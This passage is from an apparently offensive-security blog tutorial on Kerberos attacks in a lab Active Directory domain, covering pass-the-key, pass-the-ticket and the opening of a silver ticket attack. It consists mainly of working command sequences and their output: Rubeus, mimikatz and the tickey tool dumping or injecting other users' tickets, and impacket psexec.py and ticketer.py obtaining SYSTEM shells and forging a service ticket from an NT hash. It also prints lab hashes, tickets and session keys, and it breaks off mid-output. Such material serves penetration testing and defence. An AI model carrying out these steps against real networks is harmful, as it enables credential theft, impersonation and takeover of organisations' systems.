which is a widely used format for Kerberos tickets in Linux.</p><p>At the moment of writing the examples for this article some problems arised:</p><ul><li><em>PyAsn1Error(‘NamedTypes can cast only scalar values’,)</em> : Resolved by updating impacket to the lastest version.</li><li><em>KDC can’t found the name</em> : Resolved by using the hostname instead of the IP address, because it was not recognized by Kerberos KDC.</li></ul><h4>From Windows</h4><p>In order to accomplish this attack from a Windows machine, it is possible to use Rubeus and PsExec as follows:</p><pre><code class="language-shell">C:\Users\triceratops&gt;.\Rubeus.exe asktgt /domain:jurassic.park /user:velociraptor /rc4:2a3de7fe356ee524cc9f3d579f2e0aa7 /ptt

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v1.3.3

[*] Action: Ask TGT

[*] Using rc4_hmac hash: 2a3de7fe356ee524cc9f3d579f2e0aa7
[*] Using domain controller: Lab-WDC02.jurassic.park (10.200.220.3)
[*] Building AS-REQ (w/ preauth) for: 'jurassic.park\velociraptor'
[*] Connecting to 10.200.220.3:88
[*] Sent 237 bytes
[*] Received 1455 bytes
[+] TGT request successful!
[*] base64(ticket.kirbi):

      doIFSDCCBUSgAwIBBaEDAgEWooIEVjCCBFJhggROMIIESqADAgEFoQ8bDUpVUkFTU0lDLlBBUkuiIjAg
      oAMCAQKhGTAXGwZrcmJ0Z3QbDWp1cmFzc2ljLnBhcmujggQMMIIECKADAgESoQMCAQKiggP6BIID9nUy
      VTaRmuyCOYJ/Fz0Z5We4crR6qWrxpEPDZHV09VmBp0GYWwUxwGM4M2hkbFJss6i0RG1NvKUy55D2loPI
      nKXSD5kwEjJeMsVAQWvvQCNuIrVu/XY9eGhL405ryVYNELdPxOuBNXYYZoQYLo1qxcoEkH/ag4QTnG7z
      6qH1o5RWwhmqMHNWp77LGu3lBWd0lb3t7d3pfGCU7hgWRvA390dQZ+Vzrcqfs5sHzoii8ondT9LqyvYI
      4P6DwhXH1wWOVhF9Sf23wUSG5iIZvbTrHuNZvFcPmUYXF2zd0Dtx+L3ovYdWaw+7HDmu4NPspvuAlG2x
      Jj/cbGS1KuCjAtSkT9XMVu0WEFY8gIbew35l8t5H7b+8fcjTyOLFJyMIuEzTjdfzdGJ8NYsqAxG0wCtd
      w4OCuqUUHuffwD4L27PC+fVVR7D5htfy6MbWVQrVqfgGIhqdC68I5COjyknobf+ksO9EDcn8+7zDUXtE
      dbt9XZtt0VTNyZUfSyOMGW+pkpB8wA3QjzahpgrLVE/8oHGAkFQ6sf/DOr0CYinn7iC8lJ1zZj1hcDa6
      Y+RVSARW4V++03uQPwtCN6mpuhIumikFCQsOTMQky8QKcsFGHdsCqySQsAoOtdWLHpuYFnaA0VDb3M+i
      4yc5286jaF6NRRPBZJEZnSTCRNwhJCR3bgO3C5bzWKFCOFMjFy5GOCZoZdYIbKiVABG2ZFUuyMedCDQQ
      YJrLO6oFoCL5Yeu2vrviFZUSpbUVZlxSDHnASuo1PUCfnm7oF3E6aw6/Q/0/dONSQzImXC7H+t2Z7ym5
      4pIzkgIZ/p5ODWfKr/XrrBUjmPPDzGyRUz9q1NKPv0SVi8sC5wkWAe1tipU5G582PrBWuS+Nv9XLAoKL
      +LR4iWnUw3o3/96IyCiHiCGy/g1DLJehxb5/wxDxwrnpDW50kFs7bwFrbD+8qWwd8apZF/iiUyzRYJAu
      jDOTyfJtZ7Vm2mOwSm1KeUboZ3u9StIkNUbmjR/wXvwmvUCXDppO/LeMT9w5uejGNVr+QRLPL+brAkbB
      GHFoSTR0/L6k1+8vkJzAJCOA3Yir3JJd8xRdnad4Q7Pl67CjsGKrJddt6iBzoHKPabQ/SbDVIV4veMX7
      5KtcYHM8E2CvV2sV8KD1QIOSo00Ya/C/EUekjWsG3YGW7UulxDwb95mDRf6ntr7jMBC8G2jd49IuJcWR
      QTDFuys4L/NsEAqLo5RPNk6bz1SpjpWlmG95hRg5DAe1M+u8aRD6NDs3A8fH6b7fZkQ+1I/Xl5sBhfTt
      7FGbTI4mG+VlEHbJpl47KTAO+jJgYj3m0/vgcwBlO4lCMFucB3B488VEamPJU3M66hMOy6OB3TCB2qAD
      AgEAooHSBIHPfYHMMIHJoIHGMIHDMIHAoBswGaADAgEXoRIEEFg+Y8LhMIWpLiabLQKBdBihDxsNSlVS
      QVNTSUMuUEFSS6IZMBegAwIBAaEQMA4bDHZlbG9jaXJhcHRvcqMHAwUAQOEAAKURGA8yMDE5MDIyODEx
      NTc1N1qmERgPMjAxOTAyMjgyMTU3NTdapxEYDzIwMTkwMzA3MTE1NzU3WqgPGw1KVVJBU1NJQy5QQVJL
      qSIwIKADAgECoRkwFxsGa3JidGd0Gw1qdXJhc3NpYy5wYXJr

[*] Action: Import Ticket
[+] Ticket successfully imported!

C:\Users\triceratops&gt;.\PsExec.exe -accepteula \\labwws02.jurassic.park cmd

PsExec v2.2 - Execute processes remotely
Copyright (C) 2001-2016 Mark Russinovich
Sysinternals - www.sysinternals.com


Microsoft Windows [Versión 6.1.7601]
Copyright (c) 2009 Microsoft Corporation. All rights reserved.

C:\Windows\system32&gt;whoami
jurassic\velociraptor

C:\Windows\system32&gt;
</code></pre><p>In case of not passing the parameter <em>/ptt</em> to <em>Rubeus asktgt</em>, the ticket will be shown in base64. The following Powershell command can be used to write it into a file:</p><pre><code class="language-shell">[IO.File]::WriteAllBytes("ticket.kirbi", [Convert]::FromBase64String(""))
</code></pre><p>As this is a little cumbersome, I expect that the 
program will automatically save the ticket in future versions. After 
that, the command <code>Rubeus ptt /ticket:</code> can be used to inject that ticket.</p><h3>Pass The Ticket (PTT)</h3><p>This
 kind of attack is similar to Pass the Key, but instead of using hashes 
to request for a ticket, the ticket itself is stolen and used to 
authenticate as its owner. The way of recolecting these tickets changes 
from Linux to Windows machines, therefore each process will be 
introduced in its own section.</p><h4>Harvesting tickets from Linux</h4><p>On Linux, tickets are stored in credential caches or ccaches. There are 3 main types, which indicate where tickets can be found:</p><ul><li>Files, by default under /tmp directory, in the form of krb5cc_%{uid}.</li><li>Kernel Keyrings, an special space in the Linux kernel provided for storing keys.</li><li>Process memory, used when only one process needs to use the tickets.</li></ul><p>To verify what type of storage is used in a specific machine, the variable <em>default_ccache_name</em>
 must be checked in the /etc/krb5.conf file, which by default has read 
permission to any user. In case of this parameter being missing, its 
default value is <em>FILE:/tmp/krb5cc_%{uid}</em>.</p><p>Hence, tickets 
are usually saved in files, which can only be read by the owner and, 
like any file in Linux, by root. In case of having access to those 
ticket files, just with copy-pasting them into another machine, they can
 be used to perform Pass The Ticket attacks.</p><p>Example of tickets in a Linux server:</p><pre><code class="language-shell">[root@Lab-LSV01]# ls -lah /tmp/krb5*
-rw-------. 1 root         root         1.4K Mar  5 16:25 /tmp/krb5cc_0
-rw-------. 1 trex         domain users 1.2K Mar  7 10:08 /tmp/krb5cc_1120601113_ZFxZpK
-rw-------. 1 velociraptor domain users  490 Mar  7 10:14 /tmp/krb5cc_1120601115_uDoEa0
</code></pre><p>In order to extract tickets from the other 2 sources (keyrings and processes), a great paper, <a href="https://www.delaat.net/rp/2016-2017/p97/report.pdf">Kerberos Credential Thievery (GNU/Linux)</a>, released in 2017, explains ways of recovering the tickets from them.</p><p>Moreover,
 the paper also contains several scripts to substract tickets from 
remote machines. In the case of keyrings, their script heracles.sh can 
be used. In the case of a process holding the tickets, a memory analysis
 is required to found the tickets inside.</p><p>Furthermore, I have developed a tool in C based on the heracles.sh script called <a href="https://github.com/TarlogicSecurity/tickey">tickey</a>,
 to extract tickets from keyrings. The tool was created because the 
command keyctl, heavily used by heracles.sh, is not installed by default
 in Linux systems, so a direct call to the keyctl syscall can solve this
 problem.</p><p>Moreover, tickets in session or user keyrings only can 
be accesed by the owner user in the same session. Therefore, when tickey
 is executed as root, it searchs for another user sessions and injects 
itself in each one of them in order to retrieve those tickets.</p><p>An example of tickey output is shown below:</p><pre><code class="language-shell">[root@Lab-LSV01 /]# /tmp/tickey -i
[*] krb5 ccache_name = KEYRING:session:sess_%{uid}
[+] root detected, so... DUMP ALL THE TICKETS!!
[*] Trying to inject in trex[1120601113] session...
[+] Successful injection at process 21866 of trex[1120601113],look for tickets in /tmp/__krb_1120601113.ccache
[*] Trying to inject in velociraptor[1120601115] session...
[+] Successful injection at process 20752 of velociraptor[1120601115],look for tickets in /tmp/__krb_1120601115.ccache
[X] [uid:0] Error retrieving tickets
[root@Lab-LSV01 /]# klist  /tmp/__krb_1120601113.ccache
Ticket cache: FILE:/tmp/__krb_1120601113.ccache
Default principal: trex@JURASSIC.PARK

Valid starting       Expires              Service principal
05/09/2019 15:48:36  05/10/2019 01:48:36  krbtgt/JURASSIC.PARK@JURASSIC.PARK
        renew until 05/10/2019 15:48:32
</code></pre><h4>Harvesting tickets from Windows</h4><p>In Windows, 
tickets are handled and stored by the lsass (Local Security Authority 
Subsystem Service) process, which is responsible for security. Hence, to
 retrieve tickets from a Windows system, it is necessary to communicate 
with lsass and ask for them. As a non-administrative user only owned 
tickets can be fetched, however, as machine administrator, all of them 
can be harvested. For this purpose, the tools Mimikatz or Rubeus can be 
used as shown below:</p><p>Mimikatz harvesting:</p><pre><code class="language-shell">PS C:\Users\velociraptor&gt; .\mimikatz.exe

  .#####.   mimikatz 2.1.1 (x64) built on Mar 18 2018 00:21:25
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       &gt; https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        &gt; https://pingcastle.com / https://mysmartlogon.com   ***/

mimikatz # sekurlsa::tickets /export

...
&lt;-----Mimikatz Output-----&gt;
...

Authentication Id : 0 ; 42211838 (00000000:028419fe)
Session           : RemoteInteractive from 2
User Name         : trex
Domain            : JURASSIC
Logon Server      : LAB-WDC01
Logon Time        : 28/02/2019 12:14:43
SID               : S-1-5-21-1339291983-1349129144-367733775-1113

         * Username : trex
         * Domain   : JURASSIC.PARK
         * Password : (null)

        Group 0 - Ticket Granting Service
         [00000000]
           Start/End/MaxRenew: 05/03/2019 9:48:37 ; 05/03/2019 19:15:59 ; 07/03/2019 12:14:43
           Service Name (02) : LDAP ; Lab-WDC02.jurassic.park ; jurassic.park ; @ JURASSIC.PARK
           Target Name  (02) : LDAP ; Lab-WDC02.jurassic.park ; jurassic.park ; @ JURASSIC.PARK
           Client Name  (01) : trex ; @ JURASSIC.PARK ( JURASSIC.PARK )
           Flags 40a50000    : name_canonicalize ; ok_as_delegate ; pre_authent ; renewable ; forwardable ;
           Session Key       : 0x00000012 - aes256_hmac
             bd16db915bdfb0af3d57509bdea3d92bf8f0ef9976a16ebb6510111597c6d8b6
           Ticket            : 0x00000012 - aes256_hmac       ; kvno = 4        [...]
           * Saved to file [0;28419fe]-0-0-40a50000-trex@LDAP-Lab-WDC02.jurassic.park.kirbi !

        Group 1 - Client Ticket ?

        Group 2 - Ticket Granting Ticket
         [00000000]
           Start/End/MaxRenew: 28/02/2019 12:14:43 ; 28/02/2019 22:14:43 ; 07/03/2019 12:14:43
           Service Name (02) : krbtgt ; JURASSIC.PARK ; @ JURASSIC.PARK
           Target Name  (--) : @ JURASSIC.PARK
           Client Name  (01) : trex ; @ JURASSIC.PARK ( $$Delegation Ticket$$ )
           Flags 60a00000    : pre_authent ; renewable ; forwarded ; forwardable ;
           Session Key       : 0x00000012 - aes256_hmac
             21666ffd3511fb2d1e127ad96e322c3a6e8be644eabba4821ba5c425b4a58842
           Ticket            : 0x00000012 - aes256_hmac       ; kvno = 2        [...]
           * Saved to file [0;28419fe]-2-0-60a00000-trex@krbtgt-JURASSIC.PARK.kirbi !
         [00000001]
           Start/End/MaxRenew: 05/03/2019 9:15:59 ; 05/03/2019 19:15:59 ; 07/03/2019 12:14:43
           Service Name (02) : krbtgt ; JURASSIC.PARK ; @ JURASSIC.PARK
           Target Name  (02) : krbtgt ; JURASSIC.PARK ; @ JURASSIC.PARK
           Client Name  (01) : trex ; @ JURASSIC.PARK ( JURASSIC.PARK )
           Flags 40e00000    : pre_authent ; initial ; renewable ; forwardable ;
           Session Key       : 0x00000012 - aes256_hmac
             f79644af74ade15f4178e5cea3b0ce071b601f78ef4b11c09ed971142dd3bb50
           Ticket            : 0x00000012 - aes256_hmac       ; kvno = 2        [...]
           * Saved to file [0;28419fe]-2-1-40e00000-trex@krbtgt-JURASSIC.PARK.kirbi !

...
&lt;-----Mimikatz Output-----&gt;
...
           
mimikatz # exit
Bye!
</code></pre><p>Rubeus harvesting in powershell:</p><pre><code class="language-shell">PS C:\Users\Administrator&gt; .\Rubeus dump

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v1.4.2



[*] Action: Dump Kerberos Ticket Data (All Users)


  UserName                 : Administrator
  Domain                   : JURASSIC
  LogonId                  : 0xdee0cb2
  UserSID                  : S-1-5-21-1339291983-1349129144-367733775-500
  AuthenticationPackage    : Kerberos
  LogonType                : RemoteInteractive
  LogonTime                : 07/03/2019 12:35:47
  LogonServer              : LAB-WDC01
  LogonServerDNSDomain     : JURASSIC.PARK
  UserPrincipalName        : Administrator@jurassic.park

...
&lt;-----Rubeus Output-----&gt;
...

    ServiceName              : krbtgt/JURASSIC.PARK
    TargetName               : krbtgt/jurassic.park
    ClientName               : trex
    DomainName               : JURASSIC.PARK
    TargetDomainName         : JURASSIC.PARK
    AltTargetDomainName      : JURASSIC.PARK
    SessionKeyType           : aes256_cts_hmac_sha1
    Base64SessionKey         : 1gokewLDdgqAnN3a1KNR15q3GaZM3duydjLfb037KLs=
    KeyExpirationTime        : 01/01/1601 1:00:00
    TicketFlags              : pre_authent, initial, renewable, forwardable
    StartTime                : 07/03/2019 16:28:23
    EndTime                  : 08/03/2019 2:28:23
    RenewUntil               : 14/03/2019 16:28:23
    TimeSkew                 : 0
    EncodedTicketSize        : 1284
    Base64EncodedTicket      :

      doIFADCCBPygAwIBBaEDAgEWooIEBjCCBAJhggP+MIID+qADAgEFoQ8bDUpVUkFTU0lDLlBBUkuiIjAgoAMCAQKhGTAXGwZrcmJ0
      Z3QbDUpVUkFTU0lDLlBBUkujggO8MIIDuKADAgESoQMCAQKiggOqBIIDpp9Nm0OTu82mrTl0Tekr8KEF3eX23qxHKcryCuzDV/Pd
      wUNpSc+1Oxa0k2WWvZwa+H9DW4I8fr0BE7oHMs6GaNFEjDJdO/l0qGUlCwyha05+9lg832SDEERgAA1wQDLjPogyBBTrP5OhGmf0
      JevqulePfTUSxXJ/gNvP6JCQGAf+zUL12dqGkqyq//TOWSQjkgAy3NZtc1Ed3XnfI9L4VUo9YdY5fVSEci7kRm6Mk11sTV7bXSzd
      4123fXLA3Usx+xJVKh5JPhvtSyDKRDNdcP2YKPoTyEuKUpsl8KhzbkEpdLPqzR+2uLHNmMzWDdsxTlytzZF9kzB9llUB2C9YLgzD
      Qkrx4/EIDH9w3u3pVVgAmZp1Y9sQhVmI9exIYVSPM/XA8vPAL1KDGyux+ojkVDAl/Kezqg6DWtLZO86Rpb7L7LRvk8jX/4Y4Yi0T
      MlsZjahwXn1N3ZulUiF7pvYzh9es9MkS/X/YqF6CiDogblLEaFniMYWNYFYMmhjfIZHgX3lyIj8UljRwdeFdt7Ezf/pmP1rl5uON
      hMlagv+prw4UcvN2u4Yeb+ybXMisMH4xonJIBr7/MKEhmbHVmKuoT+LBMjfN7iChY82rPqbKW0J+nn4yvC3zjLlOC5HNSTdMgGV5
      FSAY34RO3SCOe14jetHmq9OQ5rLO5ymWfet5jcYy+ShtrYoNTxEPodNZyFqrBDT4JZ6T9jgoYMIu+g3VcoCRN5XDUJM+tBzZ6QUu
      91D0ULl3wdvbEhh89hPAy1AHEWLtAth55/CJ0kNpWLPvLLz34OLzNg8nzCG2x9mFVP4MKvUw4JJN3LSkYRrxIg5eehSuQul43ZqQ
      hxi/+OyRoVwSfqqMeYO2QSeADaIiaFTwWaIDAu0pr1Vk+XfJGuHUWBjRocHu3dasPMhGoRlV5ehHxc58gnJ6UzkfcVDV7j1Skn7e
      os6wa6ejFOrMKNSB+cBqBcvBMCCksHsnQSd4gxUiw/7Masc9M+f9Xi3vf+f0LyiSKDdUIDOekMh/RqQhGs9UKSjp6/Q7EhMCd90J
      UDGbwBQZhTOBZApdo1VQ609kXfv654RSZ1OzSgaaK6P0GJdJGJ5NGIuNl1n0oEOZVB0FfATLH/xC9uD97VkH2mQ8jnFHHxseUle2
      qMhkG+NsLOD7c2c9pzUNEbc4EZEjwMFx4eJwEeLnpXOMOMS6ix1YMuZjof6Q8xNmq05vpNMAOScgV7d3QmMvJLNy6LB6gBKPPBqG
      4kCjgeUwgeKgAwIBAKKB2gSB132B1DCB0aCBzjCByzCByKArMCmgAwIBEqEiBCDWCiR7AsN2CoCc3drUo1HXmrcZpkzd27J2Mt9v
      Tfsou6EPGw1KVVJBU1NJQy5QQVJLohEwD6ADAgEBoQgwBhsEdHJleKMHAwUAQOAAAKURGA8yMDE5MDMwNzE1MjgyM1qmERgPMjAx
      OTAzMDgwMTI4MjNapxEYDzIwMTkwMzE0MTUyODIzWqgPGw1KVVJBU1NJQy5QQVJLqSIwIKADAgECoRkwFxsGa3JidGd0Gw1KVVJB
      U1NJQy5QQVJL


...
&lt;-----Rubeus Output-----&gt;
...

[*] Enumerated 23 total tickets
[*] Extracted  23 total tickets

PS C:\Users\Administrator&gt; [IO.File]::WriteAllBytes("ticket.kirbi", [Convert]::FromBase64String("doIFADCCBPygAwIBBaEDAgEWooIEBjCCBAJhggP+MIID+qADAgEFoQ8bDUpVUkFTU0lDLlBBUkuiIjAgoAMCAQKhGTAXGwZrcmJ0Z3QbDUpVUkFTU0lDLlBBUkujggO8MIIDuKADAgESoQMCAQKiggOqBIIDpp9Nm0OTu82mrTl0Tekr8KEF3eX23qxHKcryCuzDV/PdwUNpSc+1Oxa0k2WWvZwa+H9DW4I8fr0BE7oHMs6GaNFEjDJdO/l0qGUlCwyha05+9lg832SDEERgAA1wQDLjPogyBBTrP5OhGmf0JevqulePfTUSxXJ/gNvP6JCQGAf+zUL12dqGkqyq//TOWSQjkgAy3NZtc1Ed3XnfI9L4VUo9YdY5fVSEci7kRm6Mk11sTV7bXSzd4123fXLA3Usx+xJVKh5JPhvtSyDKRDNdcP2YKPoTyEuKUpsl8KhzbkEpdLPqzR+2uLHNmMzWDdsxTlytzZF9kzB9llUB2C9YLgzDQkrx4/EIDH9w3u3pVVgAmZp1Y9sQhVmI9exIYVSPM/XA8vPAL1KDGyux+ojkVDAl/Kezqg6DWtLZO86Rpb7L7LRvk8jX/4Y4Yi0TMlsZjahwXn1N3ZulUiF7pvYzh9es9MkS/X/YqF6CiDogblLEaFniMYWNYFYMmhjfIZHgX3lyIj8UljRwdeFdt7Ezf/pmP1rl5uONhMlagv+prw4UcvN2u4Yeb+ybXMisMH4xonJIBr7/MKEhmbHVmKuoT+LBMjfN7iChY82rPqbKW0J+nn4yvC3zjLlOC5HNSTdMgGV5FSAY34RO3SCOe14jetHmq9OQ5rLO5ymWfet5jcYy+ShtrYoNTxEPodNZyFqrBDT4JZ6T9jgoYMIu+g3VcoCRN5XDUJM+tBzZ6QUu91D0ULl3wdvbEhh89hPAy1AHEWLtAth55/CJ0kNpWLPvLLz34OLzNg8nzCG2x9mFVP4MKvUw4JJN3LSkYRrxIg5eehSuQul43ZqQhxi/+OyRoVwSfqqMeYO2QSeADaIiaFTwWaIDAu0pr1Vk+XfJGuHUWBjRocHu3dasPMhGoRlV5ehHxc58gnJ6UzkfcVDV7j1Skn7eos6wa6ejFOrMKNSB+cBqBcvBMCCksHsnQSd4gxUiw/7Masc9M+f9Xi3vf+f0LyiSKDdUIDOekMh/RqQhGs9UKSjp6/Q7EhMCd90JUDGbwBQZhTOBZApdo1VQ609kXfv654RSZ1OzSgaaK6P0GJdJGJ5NGIuNl1n0oEOZVB0FfATLH/xC9uD97VkH2mQ8jnFHHxseUle2qMhkG+NsLOD7c2c9pzUNEbc4EZEjwMFx4eJwEeLnpXOMOMS6ix1YMuZjof6Q8xNmq05vpNMAOScgV7d3QmMvJLNy6LB6gBKPPBqG4kCjgeUwgeKgAwIBAKKB2gSB132B1DCB0aCBzjCByzCByKArMCmgAwIBEqEiBCDWCiR7AsN2CoCc3drUo1HXmrcZpkzd27J2Mt9vTfsou6EPGw1KVVJBU1NJQy5QQVJLohEwD6ADAgEBoQgwBhsEdHJleKMHAwUAQOAAAKURGA8yMDE5MDMwNzE1MjgyM1qmERgPMjAxOTAzMDgwMTI4MjNapxEYDzIwMTkwMzE0MTUyODIzWqgPGw1KVVJBU1NJQy5QQVJLqSIwIKADAgECoRkwFxsGa3JidGd0Gw1KVVJBU1NJQy5QQVJL"))
</code></pre><p>And finally, after executing any of those tools, tickets are dumped, ready to use except for those expired.</p><h4>Swaping Linux and Windows tickets between platforms</h4><p>Before
 start using the tickets, it is important to have them in the proper 
format, due to Windows and Linux using different approaches to save 
them. In order to convert from ccache (Linux file format) to kirbi 
(Windows file format used by Mimikatz and Rubeus), and vice versa, the 
following tools can be used:</p><ul><li>The <a href="https://github.com/Zer1t0/ticket_converter">ticket_converter</a>
 script. The only needed parameters are the current ticket and the 
output file, it automatically detects the input ticket file format and 
converts it. For example:</li></ul><pre><code class="language-shell">root@kali:ticket_converter# python ticket_converter.py velociraptor.ccache velociraptor.kirbi
Converting ccache =&gt; kirbi
root@kali:ticket_converter# python ticket_converter.py velociraptor.kirbi velociraptor.ccache
Converting kirbi =&gt; ccache
</code></pre><ul><li><a href="https://github.com/gentilkiwi/kekeo">Kekeo</a>,
 to convert them in Windows. This tool was not checked due to requiring a
 license in their ASN1 library, but I think it is worth mentioning.</li></ul><h4>From Linux</h4><p>To perform the pass the ticket attack by using psexec.py from impacket, just do the following:</p><pre><code class="language-shell">root@kali:impacket-examples# export KRB5CCNAME=/root/impacket-examples/krb5cc_1120601113_ZFxZpK 
root@kali:impacket-examples# python psexec.py jurassic.park/trex@labwws02.jurassic.park -k -no-pass
Impacket v0.9.18 - Copyright 2018 SecureAuth Corporation

[*] Requesting shares on labwws02.jurassic.park.....
[*] Found writable share ADMIN$
[*] Uploading file SptvdLDZ.exe
[*] Opening SVCManager on labwws02.jurassic.park.....
[*] Creating service zkNG on labwws02.jurassic.park.....
[*] Starting service zkNG.....
[!] Press help for extra shell commands
Microsoft Windows [Versión 6.1.7601]
Copyright (c) 2009 Microsoft Corporation. All rights reserved.

C:\Windows\system32&gt;whoami
nt authority\system

C:\Windows\system32&gt;

</code></pre><p>As with PTK attacks, in order to use a ticket with any impacket tool, just specify the KRB5CCNAME environment variable and the <em>-no-pass -k</em> parameters.</p><p>While performing this technique, an error was shown by impacket: <em>[-] SMB SessionError: STATUS_ACCESS_DENIED…</em>,
 even if the user had access to the remote machine. This issue was 
caused by the fact that a ticket without the A flag (pre-authenticated) 
was used, because that domain user did not need Kerberos 
pre-authentication. To check ticket flags in Linux, the command <em>klist -f </em> can be used, which is part of the krb5 package. Example:</p><pre><code class="language-shell">root@kali:impacket-examples# klist -f -c krb5cc_1120601113_ZFxZpK
Ticket cache: FILE:krb5cc_1120601113_ZFxZpK
Default principal: velociraptor@JURASSIC.PARK

Valid starting     Expires            Service principal
03/07/19 11:08:45  03/07/19 21:08:45  krbtgt/JURASSIC.PARK@JURASSIC.PARK
	renew until 03/08/19 11:08:41, Flags: RIA
</code></pre><h4>From Windows</h4><p>In a Windows machine, Rubeus or 
Mimikatz can be used in order to inject tickets in the current session, 
no special privileges are required to accomplish this task. After that, 
it is possible to use a tool like PsExec to execute commands in remote 
machines as the new user. Example executions of both tools are shown 
below:</p><p>Mimikatz example:</p><pre><code class="language-shell">PS C:\Users\velociraptor&gt; .\mimikatz.exe

  .#####.   mimikatz 2.1.1 (x64) built on Mar 18 2018 00:21:25
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       &gt; https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        &gt; https://pingcastle.com / https://mysmartlogon.com   ***/

mimikatz # kerberos::ptt [0;28419fe]-2-1-40e00000-trex@krbtgt-JURASSIC.PARK.kirbi

* File: '[0;28419fe]-2-1-40e00000-trex@krbtgt-JURASSIC.PARK.kirbi': OK

mimikatz # exit
Bye!
PS C:\Users\velociraptor&gt; klist

Current LogonId is 0:0x34f9571

Cached Tickets: (1)

#0&gt;     Client: trex @ JURASSIC.PARK
        Server: krbtgt/JURASSIC.PARK @ JURASSIC.PARK
        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
        Ticket Flags 0x40e00000 -&gt; forwardable renewable initial pre_authent
        Start Time: 3/5/2019 9:15:59 (local)
        End Time:   3/5/2019 19:15:59 (local)
        Renew Time: 3/7/2019 12:14:43 (local)
        Session Key Type: AES-256-CTS-HMAC-SHA1-96

PS C:\Users\velociraptor&gt; .\PsExec.exe -accepteula \\lab-wdc01.jurassic.park cmd

PsExec v2.2 - Execute processes remotely
Copyright (C) 2001-2016 Mark Russinovich
Sysinternals - www.sysinternals.com


Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32&gt;whoami
jurassic\trex

C:\Windows\system32&gt;
</code></pre><p>Rubeus example:</p><pre><code class="language-shell">C:\Users\velociraptor&gt;.\Rubeus.exe ptt /ticket:[0;28419fe]-2-1-40e00000-trex@krbtgt-JURASSIC.PARK.kirbi

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v1.3.3


[*] Action: Import Ticket
[+] Ticket successfully imported!

C:\Users\velociraptor&gt;klist

Current LogonId is 0:0x34f958e

Cached Tickets: (1)

#0&gt;     Client: trex @ JURASSIC.PARK
        Server: krbtgt/JURASSIC.PARK @ JURASSIC.PARK
        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
        Ticket Flags 0x40e00000 -&gt; forwardable renewable initial pre_authent
        Start Time: 3/5/2019 9:15:59 (local)
        End Time:   3/5/2019 19:15:59 (local)
        Renew Time: 3/7/2019 12:14:43 (local)
        Session Key Type: AES-256-CTS-HMAC-SHA1-96


C:\Users\velociraptor&gt;.\PsExec.exe -accepteula \\lab-wdc01.jurassic.park cmd

PsExec v2.2 - Execute processes remotely
Copyright (C) 2001-2016 Mark Russinovich
Sysinternals - www.sysinternals.com


Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32&gt;whoami
jurassic\trex

C:\Windows\system32&gt;
</code></pre><p>After injecting the ticket of a user account, it is 
possible to act on behalf of that user in remote machines, but not in 
the local one, where Kerberos doesn’t apply. Remember that TGT tickets 
are more useful than TGS ones, as they are not restricted to one service
 only.</p><h3>Silver ticket</h3><p>The Silver ticket attack is based on 
crafting a valid TGS for a service once the NTLM hash of a user account 
is owned. Thus, it is possible to gain access to that service by forging
 a custom TGS with the maximum privileges inside it.</p><p>In this case,
 the NTLM hash of a computer account (which is kind of a user account in
 AD) is owned. Hence, it is possible to craft a ticket in order to get 
into that machine with administrator privileges through the SMB service.</p><p>It
 also must be taken into account that it is possible to forge tickets 
using the AES Kerberos keys (AES128 and AES256), which are calculated 
from the password as well, and can be used by Impacket and Mimikatz to 
craft the tickets. Moreover, these keys, unlike the NTLM hash, are 
salted with the domain and username. In order to know more about how 
this keys are calculated, it is recommended to read the <a href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-kile/936a4878-9462-4753-aac8-087cd3ca4625">section 4.4 of MS-KILE</a> or the <a href="https://gist.github.com/Kevin-Robertson/9e0f8bfdbf4c1e694e6ff4197f0a4372">Get-KerberosAESKey.ps1</a> script.</p><h4>From Linux</h4><p>As
 usual, it is possible to perform these attacks from a Linux machine by 
using the examples provided by impacket. In this case ticketer.py is 
used to forge a TGS:</p><pre><code class="language-shell">root@kali:impacket-examples# python ticketer.py -nthash b18b4b218eccad1c223306ea1916885f -domain-sid S-1-5-21-1339291983-1349129144-367733775 -domain jurassic.park -spn cifs/labwws02.jurassic.park  stegosaurus
Impacket v0.9.18 - Copyright 2018 SecureAuth Corporation

[*] Creating basic skeleton ticket and PAC Infos
[*] Customizing ticket for jurassic.park/stegosaurus
[*] 	PAC_LOGON_INFO
[*] 	PAC_CLIENT_INFO_TYPE
[*] 	EncTicketPart
[*] 	EncTGSRepPart
[*] Signing/Encrypting final ticket
[*] 	PAC_SERVER_CHECKSUM
[*] 	PAC_PRIVSVR_CHECKSUM
[*] 	EncTicketPart
[*] 	EncTGSRepPart
[*] Saving ticket in stegosaurus.ccache
root@kali:impacket-examples# export KRB5CCNAME=/root/impacket-examples/stegosaurus.ccache 
root@kali:impacket-examples# python psexec.py jurassic.park/stegosaurus@labwws02.jurassic.park -k -no-pass
Impacket v0.9.18 - Copyright 2018 SecureAuth Corporation

[*] Requesting shares on labwws02.jurassic.park.....
[*] Found writable share ADMIN$
[*] Uploading file JhRQHMnu.exe
[*] Opening SVCManager on labwws02.jurassic.park.....
[*] Creating service Drvl on labwws02.jurassic.park.....
[*] Starting service Drvl.....
[!] Press help for extra shell commands
